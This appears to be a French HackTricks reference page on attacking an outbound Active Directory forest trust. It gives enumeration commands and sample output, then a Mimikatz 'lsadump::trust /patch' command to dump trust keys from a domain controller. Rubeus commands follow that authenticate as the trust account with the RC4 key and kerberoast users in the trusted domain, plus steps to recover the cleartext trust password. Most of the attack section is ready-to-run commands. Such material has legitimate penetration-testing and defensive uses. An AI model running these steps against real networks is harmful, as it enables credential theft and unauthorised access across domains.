# Domaine de forêt externe - Unidirectionnel (Sortant)

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Dans ce scénario, **votre domaine** accorde **confiance** à certains **privilèges** à un principal d'un **domaine différent**.

## Énumération

### Confiance sortante
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Attaque de compte de confiance

Lorsqu'une confiance de domaine ou de forêt Active Directory est établie d'un domaine _B_ vers un domaine _A_ (_**B**_ fait confiance à A), un compte de confiance est créé dans le domaine **A**, nommé **B. Les clés de confiance Kerberos**, dérivées du **mot de passe du compte de confiance**, sont utilisées pour **chiffrer les TGT inter-royaumes**, lorsque les utilisateurs du domaine A demandent des tickets de service pour des services dans le domaine B.

Il est possible d'obtenir le mot de passe et le hash du compte de confiance à partir d'un Contrôleur de Domaine en utilisant :
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Le risque est dû au fait que le compte de confiance B$ est activé, **le Groupe Principal de B$ est Domain Users du domaine A**, toute permission accordée aux Domain Users s'applique à B$, et il est possible d'utiliser les identifiants de B$ pour s'authentifier contre le domaine A.

{% hint style="warning" %}
Par conséquent, **depuis le domaine faisant confiance, il est possible d'obtenir un utilisateur à l'intérieur du domaine de confiance**. Cet utilisateur n'aura pas beaucoup de permissions (probablement juste Domain Users) mais vous serez capable de **recenser le domaine externe**.
{% endhint %}

Dans cet exemple, le domaine faisant confiance est `ext.local` et le domaine de confiance est `root.local`. Par conséquent, un utilisateur appelé `EXT$` est créé à l'intérieur de `root.local`.
```bash
# Use mimikatz to dump trusted keys
lsadump::trust /patch
# You can see in the output the old and current credentials
# You will find clear text, AES and RC4 hashes
```
Par conséquent, à ce stade, nous avons le **mot de passe en clair actuel et la clé secrète Kerberos de `root.local\EXT$`**. Les clés secrètes Kerberos AES de **`root.local\EXT$`** ne sont pas identiques aux clés de confiance AES car un sel différent est utilisé, mais **les clés RC4 sont les mêmes**. Par conséquent, nous pouvons **utiliser la clé de confiance RC4** extraite de ext.local pour **s'authentifier** en tant que `root.local\EXT$` contre `root.local`.
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Avec cela, vous pouvez commencer à énumérer ce domaine et même à effectuer du kerberoasting sur les utilisateurs :
```
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Collecte du mot de passe de confiance en clair

Dans le flux précédent, le hash de confiance a été utilisé au lieu du **mot de passe en clair** (qui a également été **extrait par mimikatz**).

Le mot de passe en clair peut être obtenu en convertissant la sortie \[ CLEAR ] de mimikatz de l'hexadécimal et en supprimant les octets nuls ‘\x00’ :

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

Parfois, lors de la création d'une relation de confiance, un mot de passe doit être saisi par l'utilisateur pour la confiance. Dans cette démonstration, la clé est le mot de passe de confiance original et donc lisible par l'homme. Comme la clé change tous les 30 jours, le texte en clair ne sera pas lisible par l'homme mais techniquement toujours utilisable.

Le mot de passe en clair peut être utilisé pour effectuer une authentification régulière en tant que compte de confiance, une alternative à la demande d'un TGT en utilisant la clé secrète Kerberos du compte de confiance. Ici, interrogation de root.local depuis ext.local pour les membres des Domain Admins :

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## Références

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
